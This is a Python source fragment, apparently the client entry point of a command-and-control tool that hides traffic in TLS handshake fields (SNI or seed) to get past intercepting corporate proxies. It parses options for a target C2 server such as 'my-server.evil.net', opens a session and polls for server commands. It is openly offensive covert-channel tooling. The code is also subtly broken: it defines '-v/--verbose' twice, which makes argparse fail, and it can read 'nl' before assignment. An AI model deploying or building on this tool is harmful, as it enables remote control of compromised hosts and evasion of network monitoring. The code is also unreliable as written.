    # Grab our args from the CLI
    arg_parse = argparse.ArgumentParser(
        description="Send and Receive messages via TLS Handshakes through an interception proxy"
    )
    arg_parse.add_argument(
        "-p",
        "--proxy",
        metavar="proxy",
        required=False,
        help="Intercepting HTTP Proxy to use, Example: http://proxy.company.com:8080/",
    )
    arg_parse.add_argument(
        "-e",
        "--example",
        action="store_true",
        required=False,
        help="A simple demonstration that runs a couple benign C2 commands",
    )
    arg_parse.add_argument(
        "-d",
        "--direct",
        action="store_true",
        required=False,
        help="For testing - Connect directly to server and dont use a proxy",
    )
    arg_parse.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        required=False,
        help="Be more verbose",
    )
    arg_parse.add_argument(
        "-s",
        "--server",
        metavar="server",
        required=True,
        help="Target C2 Server you want to connect to, Example: my-server.evil.net",
    )
    arg_parse.add_argument(
        "-m",
        "--mode",
        metavar="mode",
        required=False,
        help="Manually set the smuggling mode [ 'sni' || 'seed' ]",
    )
    arg_parse.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        required=False,
        help="Print out all request and response sent/rcvd",
    )
    arg_parse.add_argument(
        "-c",
        "--connection",
        action="store_true",
        required=False,
        help="Test Connection to a C2 Server",
    )
    arg_parse.add_argument(
        "-t",
        "--threads",
        metavar="threads",
        required=False,
        help="How many threads to run (for multiplexing our send operations): int > 1",
    )
    # Validate the the args provided
    args = arg_parse.parse_args()
    if not args.proxy and not args.direct:
        arg_parse.error("Error: Either -d for direct connect or supply a valid --proxy argument")
    if not args.server:
        arg_parse.error("Error: No server (--server) was supplied. Example: --server c2-server.evil.net:8443")
    if args.verbose:
        VERBOSE = True
    if args.mode:
        if args.mode.lower() == "seed":
            CLIENT_MODE = "seed"
    if args.threads:
        THREADS = int(args.threads)
        if THREADS < 2:
            THREADS = 2
        if THREADS > MAX_THREADS:
            THREADS = MAX_THREADS
    proxy = None
    proxy_hostname = proxy_scheme = ""
    proxy_port = 0
    if args.proxy:
        is_good_proxy_url = True
        try:
            proxy_scheme = args.proxy.lower().split(":")[0]
            proxy_hostname = args.proxy.lower().split("//")[1]
            proxy_port = int(proxy_hostname.split(":")[1].split("/")[0])
            proxy_hostname = proxy_hostname.split(":")[0].split("/")[0]
        except:
            is_good_proxy_url = False
        if (proxy_scheme != "http") or (len(proxy_hostname) < 3) or (not proxy_port) or (not is_good_proxy_url):
            arg_parse.error("Error: The Supplied proxy URL appears invalid. Example: http://proxy.company.com:8080/")
            exit(1)
        if not args.direct:
            proxy = proxy_hostname + ":" + str(proxy_port)
    # If we get here, args are valid. Now we setup are C2 Session
    session = Session(server=args.server.lower(), proxy=proxy, test_mode=args.connection)
    #
    # TODO: Make client sessions persist!
    # Which means a client will hash some machine specific attribute and write it to file, etc
    # This so we can persist even if the client crashes or is quit, for example
    #
    # Validate that we have an established session
    if args.connection:
        exit(0)
    if not session.is_connected:
        print(f"[!] Error - Could not establish a C2 Session with the Server. Details: {session.result_msg}")
        exit(1)
    # If we get here, we have an established C2 Session :)
    print(f"[+] CONNECTED to server '{session.server}' in {session.rtt_ms}ms - Client ID: {session.client_id.hex()}")
    print("Press Ctrl-C to exit...")
    # Now that our client is up, we periodically update the console with heartbeat status and any commands that may come in form the server
    try:
        while True:
            if not session._is_sending:
                sys.stdout.write("\033[K")
                if session.message_list and args.verbose:
                    if nl:
                        print()
                        nl = False
                    print(session.message_list.pop())
                else:
                    nl = True
                    print(
                        f"    Last Poll: {int(time.time()) - session.last_poll_time} seconds ago; RTT: {session.rtt}ms; Last Message: '{session.result_msg}'",
                        end="\r",
                    )
                    sys.stdout.flush()
                nl = False
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        print("Exiting.")
        exit(0)
